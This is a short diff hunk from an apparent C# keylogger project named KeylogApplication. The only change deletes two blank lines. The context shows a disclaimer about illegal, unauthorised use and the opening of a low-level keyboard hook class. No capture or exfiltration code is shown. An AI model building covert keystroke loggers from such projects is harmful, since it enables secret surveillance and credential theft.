@@ -13,8 +13,6 @@ namespace KeylogApplication
         Please note that using keyloggers without proper authorization is illegal and unethical. 
         This code is provided for educational purposes only.
      */
-
-
     class Program
     {
         private const int WH_KEYBOARD_LL = 13;
